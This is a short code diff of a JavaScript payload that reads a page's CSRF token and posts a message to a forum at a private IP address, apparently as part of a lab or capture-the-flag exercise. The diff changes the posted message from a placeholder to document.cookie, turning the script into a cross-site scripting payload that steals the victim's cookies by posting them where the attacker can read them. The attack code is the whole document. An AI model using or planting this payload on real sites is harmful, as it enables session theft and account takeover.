@@ -2,7 +2,7 @@ const url = 'http://10.110.15.159/forum.php';
 const token = document.querySelector('input[name="token"]').value;
 const payload = {
   post_author: 1,
-  post_msg: 'nugget',
+  post_msg: document.cookie,
   post_submit: 'Post the message',
   post_topic_id: 1,
   token: token
